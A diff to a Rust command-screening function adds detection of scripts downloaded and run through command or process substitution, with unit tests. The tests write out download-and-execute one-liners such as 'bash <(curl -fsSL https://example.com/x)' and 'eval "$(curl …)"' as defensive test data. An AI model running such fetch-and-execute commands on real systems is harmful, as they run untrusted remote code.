@@ -240,7 +240,7 @@ fn suspicion(command: &[String]) -> Option<&'static str> {
     let pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]
         .iter()
         .any(|pattern| joined.contains(pattern));
-    if downloads && pipes_to_shell {
+    if (downloads && pipes_to_shell) || runs_substituted_download(command) {
         return Some("directly runs a script it downloads");
     }
     if joined.contains("base64") && (joined.contains(" -d") || joined.contains("--decode")) {
@@ -255,6 +255,27 @@ fn suspicion(command: &[String]) -> Option<&'static str> {
         return Some("is given a path in a hidden directory");
     }
     None
+}
+
+/// Does the command run a downloaded script through command or process
+/// substitution? `sh -c "$(curl …)"`, `eval "$(curl …)"` and `bash <(curl …)`
+/// do what `curl … | sh` does. A substitution whose output is only stored
+/// (`ip=$(curl …)`) is not counted.
+fn runs_substituted_download(command: &[String]) -> bool {
+    // What may stand right before the download for its output to be run
+    // (`sh <(` also matches `bash <(` and `zsh <(`).
+    const RUNNERS: [&str; 7] = ["eval \"$(", "eval $(", "-c \"$(", "-c $(", "sh <(", "source <(", ". <("];
+    command.iter().any(|argument| {
+        // A `-c` script that is nothing but the substitution runs its output.
+        let script = argument.trim().trim_start_matches(['"', '\'']);
+        ["curl ", "wget "].iter().any(|tool| {
+            script.starts_with(&format!("$({tool}"))
+                || script.starts_with(&format!("`{tool}"))
+                || RUNNERS
+                    .iter()
+                    .any(|runner| argument.contains(&format!("{runner}{tool}")))
+        })
+    })
 }
 
 fn in_temp_dir(path: &str) -> bool {
@@ -365,6 +386,29 @@ mod tests {
     fn download_and_run_is_suspicious() {
         let downloader = command(&["/bin/sh", "-c", "curl -s http://example.com/x | sh"]);
         assert_eq!(suspicion(&downloader), Some("directly runs a script it downloads"));
+    }
+
+    #[test]
+    fn download_run_through_substitution_is_suspicious() {
+        // The same as `curl … | sh`, written with command or process substitution.
+        for script in [
+            "$(curl -fsSL https://example.com/x)",
+            "`wget -qO- https://example.com/x`",
+            "eval \"$(curl -fsSL https://example.com/x)\"",
+            "/bin/sh -c \"$(curl -fsSL https://example.com/x)\"",
+            "bash <(curl -fsSL https://example.com/x)",
+            "source <(wget -qO- https://example.com/x)",
+        ] {
+            let item = command(&["/bin/bash", "-c", script]);
+            assert_eq!(
+                suspicion(&item),
+                Some("directly runs a script it downloads"),
+                "{script}"
+            );
+        }
+        // Keeping the output in a variable runs nothing.
+        let stored = command(&["/bin/sh", "-c", "ip=$(curl -s https://example.com/ip); echo $ip"]);
+        assert_eq!(suspicion(&stored), None);
     }
 
     #[test]
